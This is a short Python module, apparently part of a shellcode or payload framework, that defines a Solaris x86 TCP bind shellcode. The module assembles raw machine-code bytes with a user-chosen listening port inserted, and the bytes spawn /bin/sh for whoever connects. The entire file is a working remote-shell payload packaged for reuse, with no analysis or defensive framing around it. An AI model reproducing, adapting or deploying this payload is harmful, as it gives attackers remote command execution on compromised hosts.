from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Unkown"
    Shellcode.info["name"] = "Solarisx86 - tcp_bind shellcode"

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 93 + Shellcode().getsize(kwargs["lport"])
        Shellcode.info["payload"] = [
            r"\x68\xff\xd8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16" 
            r"\x31\xc0\x50\x68\xff\x02"
            + kwargs["lport"] +
            r"\x89\xe7\x6a\x02\x50\x50" 
            r"\x6a\x02\x6a\x02\xb0\xe6\xff\xd6\x6a\x10\x57\x50\x31\xc0" 
            r"\xb0\xe8\xff\xd6\x5b\x50\x50\x53\xb0\xe9\xff\xd6\xb0\xea" 
            r"\xff\xd6\x6a\x09\x50\x6a\x3e\x58\xff\xd6\xff\x4f\xd8\x79" 
            r"\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" 
            r"\x50\x53\x89\xe1\x50\x51\x53\xb0\x3b\xff\xd6"

        ]
